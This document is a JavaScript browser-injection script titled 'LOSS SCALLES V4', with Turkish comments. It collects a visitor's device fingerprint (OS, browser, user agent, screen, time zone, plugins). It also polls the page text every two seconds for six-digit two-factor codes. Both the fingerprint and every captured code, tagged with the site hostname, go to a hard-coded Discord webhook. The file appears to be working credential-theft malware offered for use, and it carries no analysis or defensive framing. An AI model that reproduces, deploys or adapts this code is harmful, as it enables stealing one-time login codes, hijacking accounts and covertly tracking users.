// ===== LOSS SCALLES V4 - JSON FINGERPRINT & 2FA =====
const WEBHOOK = 'https://discord.com/api/webhooks/1515633084454932544/qVz2e7VFNp8nloVjsS_yXcdWxmAk_fAlvaV_d6-0fnD7RWyE8vJgWrkx_zffM6J4ioln';

console.log('[LS V4] Basladi');

// ===== FINGERPRINT =====
(function() {
    // Ortam kontrolü: Tarayıcı ortamı değilse çalışmayı durdur
    if (typeof window === 'undefined' || typeof navigator === 'undefined') {
        console.log('[LS V4] Tarayıcı ortamı algılanamadı, fingerprint iptal edildi.');
        return;
    }

    if (window.lsFingerprintSent) return;
    window.lsFingerprintSent = true;

    try {
        var ua = navigator.userAgent || '';
        var os = 'Unknown';
        if (ua.indexOf('Win') != -1) os = 'Windows';
        else if (ua.indexOf('Mac') != -1) os = 'MacOS';
        else if (ua.indexOf('Linux') != -1) os = 'Linux';
        else if (ua.indexOf('Android') != -1) os = 'Android';
        else if (ua.indexOf('like Mac') != -1) os = 'iOS';

        var browser = 'Unknown';
        if (ua.indexOf('Chrome') != -1 && ua.indexOf('Edg') == -1) browser = 'Chrome';
        else if (ua.indexOf('Edg') != -1) browser = 'Edge';
        else if (ua.indexOf('Firefox') != -1) browser = 'Firefox';
        else if (ua.indexOf('Safari') != -1) browser = 'Safari';
        else if (ua.indexOf('OPR') != -1) browser = 'Opera';

        var plugins = '';
        try {
            if (navigator.plugins && navigator.plugins.length > 0) {
                var pList = [];
                for (var i = 0; i < navigator.plugins.length; i++) {
                    pList.push(navigator.plugins[i].name);
                }
                plugins = pList.join(', ');
            }
        } catch(e) {
            plugins = 'Erisilemedi';
        }

        var fp = {
            type: 'FINGERPRINT',
            os: os,
            browser: browser,
            userAgent: ua,
            language: navigator.language || '',
            platform: navigator.platform || '',
            screen: (typeof screen !== 'undefined') ? (screen.width + 'x' + screen.height) : 'Unknown',
            timeZone: (typeof Intl !== 'undefined' && Intl.DateTimeFormat) ? Intl.DateTimeFormat().resolvedOptions().timeZone : '',
            plugins: plugins
        };

        var mesaj = '```json\n' + JSON.stringify(fp, null, 2) + '\n```';

        fetch(WEBHOOK, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({content: mesaj})
        }).then(function() {
            console.log('[LS V4] Fingerprint gonderildi');
        }).catch(function(e) {
            console.log('[LS V4] Hata:', e);
        });
    } catch(err) {
        console.log('[LS V4] Fingerprint hatasi:', err);
    }
})();

// ===== 2FA KOD IZLEME =====
var yakalananKodlar = {};
var sonZaman = 0;

function kodTara() {
    if (typeof document === 'undefined' || !document.body) return;
    
    var text = document.body.innerText || '';
    if (text.length < 10) return;

    var eslesmeler = text.match(/\b\d{6}\b/g);
    if (!eslesmeler) return;

    var simdi = Date.now();
    for (var i = 0; i < eslesmeler.length; i++) {
        var kod = eslesmeler[i];
        if (yakalananKodlar[kod]) continue;
        if (simdi - sonZaman < 10000) continue;

        yakalananKodlar[kod] = true;
        sonZaman = simdi;

        console.log('[LS V4] Kod bulundu:', kod);
        
        if (typeof fetch !== 'undefined') {
            fetch(WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: '2FA KODU: ' + kod + ' | ' + (typeof window !== 'undefined' ? window.location.hostname : 'Bilinmeyen Host')
                })
            }).catch(function(e) {
                console.log('[LS V4] Webhook hatasi:', e);
            });
        }
    }
}

setInterval(kodTara, 2000);
setTimeout(kodTara, 1000);

console.log('[LS V4] Hazir');